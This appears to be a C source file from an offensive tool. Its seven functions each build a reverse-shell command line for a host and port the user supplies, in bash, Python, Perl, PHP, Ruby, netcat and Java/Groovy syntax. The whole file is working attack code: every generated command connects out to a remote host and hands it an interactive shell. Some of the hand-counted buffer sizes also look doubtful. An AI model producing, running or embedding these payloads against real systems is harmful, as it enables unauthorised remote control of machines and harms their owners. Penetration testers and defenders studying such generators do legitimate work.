#include "build_shell.h"

#include <stdlib.h>
#include <string.h>

char* bash(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (27 + hostSize + portSize) * sizeof(char));

  strcpy(payload, "bash -i >& /dev/tcp/");
  strcat(payload, options.host);
  strcat(payload, "/");
  strcat(payload, options.port);
  strcat(payload, " 0>&1");

  return payload;
}

char* python(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (224 + hostSize + portSize) * sizeof(char));

  strcpy(payload,
         "python -c 'import "
         "socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_"
         "STREAM);s.connect((\"");
  strcat(payload, options.host);
  strcat(payload, "\",");
  strcat(payload, options.port);
  strcat(payload,
         "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); "
         "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");

  return payload;
}

char* perl(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (205 + hostSize + portSize) * sizeof(char));

  strcpy(payload, "perl -e 'use Socket;$i=\"");
  strcat(payload, options.host);
  strcat(payload, "\";$p=");
  strcat(payload, options.port);
  strcat(payload,
         ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,"
         "sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&"
         "S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");

  return payload;
}

char* php(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (74 + hostSize + portSize) * sizeof(char));

  strcpy(payload, "php -r '$sock=fsockopen(\"");
  strcat(payload, options.host);
  strcat(payload, "\",");
  strcat(payload, options.port);
  strcat(payload, ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'");

  return payload;
}

char* ruby(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (105 + hostSize + portSize) * sizeof(char));

  strcpy(payload, "ruby -rsocket -e'f=TCPSocket.open(\"");
  strcat(payload, options.host);
  strcat(payload, "\",");
  strcat(payload, options.port);
  strcat(payload, ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");

  return payload;
}

char* netcat(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (105 + hostSize + portSize) * sizeof(char));

  strcpy(payload, "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ");
  strcat(payload, options.host);
  strcat(payload, " ");
  strcat(payload, options.port);
  strcat(payload, " >/tmp/f");

  return payload;
}

char* java(char* payload, shell_options_t options) {
  int hostSize = strlen(options.host);
  int portSize = strlen(options.port);

  payload = realloc(payload, (162 + hostSize + portSize) * sizeof(char));

  strcpy(payload,
         "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec "
         "5<>/dev/tcp/");
  strcat(payload, options.host);
  strcat(payload, "/");
  strcat(payload, options.port);
  strcat(payload,
         ";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as "
         "String[])\np.waitFor()");

  return payload;
}
